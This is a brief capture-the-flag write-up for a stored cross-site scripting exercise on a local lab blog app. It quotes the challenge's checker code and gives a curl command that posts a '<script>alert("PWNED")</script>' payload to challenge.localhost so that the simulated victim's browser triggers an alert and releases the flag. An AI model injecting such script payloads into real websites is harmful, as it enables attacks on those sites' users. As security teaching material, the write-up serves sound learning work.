# Cross Site Scripting 2

In this challenge, we have `/challenge/server` that will server us a blog post web app. There is a `/challenge/victim`
that will act as the victim.

In the last exercise, we injected our own HTML. This time, we will inject some javascript with the `<script></script>`
tag.

We will have the same attack vector as last time, but this time the victim will spit out the flag on a different condition:

```python
try:
    WebDriverWait(browser, 1).until(EC.alert_is_present())
except TimeoutException:
    print("Failure: JavaScript alert did not trigger...")
    sys.exit(3)
else:
    print("Alert triggered! Your reward:")
    print(open("/flag").read().strip())
```

Basically, the victim has to see an alert popup, which can be caused by this js:

```javascript
alert("PWNED")
```

Therefore, we can inject into the database the following payload:

```bash
curl -d 'content=<script>alert("PWNED")</script>' 'challenge.localhost:80' -L
```

I initially had issues with the javascript not working, since I forgot to add double quotes around the string. You can debug by
opening dev tools, and looking at the console to read error messages.

Now, when the victim hits the GET endpoint, they will be suprised by the pop up and give us the flag!